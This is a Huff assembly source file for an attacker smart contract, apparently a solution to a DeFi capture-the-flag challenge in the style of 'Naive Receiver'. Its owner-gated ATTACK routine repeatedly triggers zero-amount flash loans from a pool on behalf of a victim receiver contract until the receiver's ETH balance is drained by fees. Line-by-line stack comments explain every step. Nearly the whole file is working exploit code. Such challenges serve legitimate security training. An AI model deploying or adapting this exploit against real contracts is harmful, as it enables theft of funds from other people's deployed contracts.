// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant POOL_SLOT = FREE_STORAGE_POINTER() 
#define constant RECEIVER_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> pool address (1st constructor arg) 

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    dup2            // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> pool address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000f7f78379391c5df2db5b66616d18ff92edb82022 -> receiver address (2nd constructor arg)

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [pool] - copied pool onto stack from byte offset 0x00 in mem
    [POOL_SLOT]     // [0x01, pool] - storage slot where to store pool
    sstore          // [] - copied pool to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> pool address (1st constructor arg)

    0x20            // [0x20] - byte offset in memory
    mload           // [receiver] - copied receiver onto stack from byte offset 0x20 in mem
    [RECEIVER_SLOT] // [0x02] - storage slot where receiver will be copied to 
    sstore          // [] - copied receiver to storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> pool address (1st constructor arg)
    // [SLOT 0x02] 000000000000000000000000f7f78379391c5df2db5b66616d18ff92edb82022 -> receiver address (2nd constructor arg)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy `ETH()` and `flashLoan(address,address,uint256,bytes)` func sigs into mem to use as calldata for STATICCALL & CALL
    0x8322fff25cffe9de  // [func_sigs]
    0x00                // [0x00, 0x5cffe9de] - byte offset in mem
    mstore              // [] - copied func sig into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000008322fff25cffe9de-> `ETH()` & `flashLoan(...)` func sigs

    // Copy receiver into memory to use as calldata for CALl
    [RECEIVER_SLOT] // [0x02] - storage slot where receiver address is
    sload           // [receiver] - copied receiver onto stack from storage slot 0x02
    dup1            // [receiver, receiver] - duplicate receiver to use later for checks
    0x20            // [0x20, receiver, receiver] - byte offset in mem
    mstore          // [receiver] - copied receiver into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000008322fff25cffe9de-> `ETH()` & `flashLoan(...)` func sigs
    // [OFFSET 0x20]  000000000000000000000000f7f78379391c5df2db5b66616d18ff92edb82022 -> receiver (address)

    // STATICCALL into pool
    [POOL_SLOT]     // [0x01, receiver] - storage slot where pool is
    sload           // [pool, receiver] - copied pool onto stack from storage slot 0x01
    0x20            // [0x20, pool, receiver] - size of return data (address)
    0x40            // [0x40, 0x20, pool, receiver] - byte offset in mem where return data is copied
    0x04            // [0x04, 0x40, 0x20, pool, receiver] - size of calldata
    0x18            // [0x18, 0x04, 0x40, 0x20, pool, receiver] - byte offset in mem where calldata starts
    dup5            // [pool, 0x18, 0x04, 0x40, 0x20, pool, receiver] - calling pool
    gas             // [gas, pool, 0x18, 0x04, 0x40, 0x20, pool, receiver] - gas to send with staticcall (gasleft())
    staticcall      // [success, pool, receiver] - consumes top 6 items and pushes 1 if call was successful, 0 otherwise
    iszero          // [0/1, pool receiver]
    throw_error     // [throw_error, 0/1, pool, receiver]
    jumpi           // [pool, receiver]

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000008322fff25cffe9de-> `ETH()` & `flashLoan(...)` func sigs
    // [OFFSET 0x20]  000000000000000000000000f7f78379391c5df2db5b66616d18ff92edb82022 -> receiver (address)
    // [OFFSET 0x40]  000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee -> ETH (address)

    // Amount and data will both be empty and data is of type bytes so we need to include the offset for bytes
    0x80            // [0x80, pool, receiver] - byte offset for bytes param
    0x80            // [0x80, 0x80, pool, receiver] - offset in mem 
    mstore          // [pool, receiver] - copied 0x80 into mem at byte offset 0x80 (note that amount param is 0 at offset 0x60)

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000008322fff25cffe9de-> `ETH()` & `flashLoan(...)` func sigs
    // [OFFSET 0x20]  000000000000000000000000f7f78379391c5df2db5b66616d18ff92edb82022 -> receiver (address)
    // [OFFSET 0x40]  000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee -> ETH (address)
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000000 -> amount (uint256)
    // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    
    flash:
        // CALL into pool
        0x00            // [0x00, pool, receiver] - size of return data
        dup1            // [0x00, 0x00, pool, receiver] - byte offset in mem where return data is copied
        0xc4            // [0xc4, 0x00, 0x00, pool, receiver] - size of calldata (196 bytes | func sig (4), receiver (32), ETH (32), amount (32), data (96))
        0x1c            // [0x1c, 0xc4, 0x00, 0x00, pool, receiver] - byte offset in mem where calldata starts
        dup3            // [0x00, 0x1c, 0xc4, 0x00, 0x00, pool, receiver] - msg.value to send with call (none)
        dup6            // [pool, 0x00, 0x1c, 0xc4, 0x00, 0x00, pool, receiver] - calling pool
        gas             // [gas, pool, 0x00, 0x1c, 0xc4, 0x00, 0x00, pool, receiver] - gas to send with call (gasleft())
        call            // [success, pool, receiver] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
        iszero          // [0/1, pool, receiver]
        throw_error     // [throw_error, 0/1, pool, receiver]
        jumpi           // [pool, receiver]

        // MEMORY:
        // [OFFSET 0x00]  0000000000000000000000000000000000000000000000008322fff25cffe9de-> `ETH()` & `flashLoan(...)` func sigs
        // [OFFSET 0x20]  000000000000000000000000f7f78379391c5df2db5b66616d18ff92edb82022 -> receiver (address)
        // [OFFSET 0x40]  000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee -> ETH (address)
        // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000000 -> amount (uint256)
        // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
        // [OFFSET 0xa0]  0000000000000000000000000000000000000000000000000000000000000000 -> bytes length offset
        // [OFFSET 0xc0]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes param value

    // Check balance of receiver. If not 0 then call into pool again
    dup2            // [receiver, pool, receiver]
    balance         // [receiver_bal, pool, receiver] - receiver balance
    flash           // [flash, receiver_bal, pool, receiver] - label for flash loan call instructions
    jumpi           // [pool, receiver] - will jump to flash loan call if receiver_bal is not 0
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
    
    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()
}
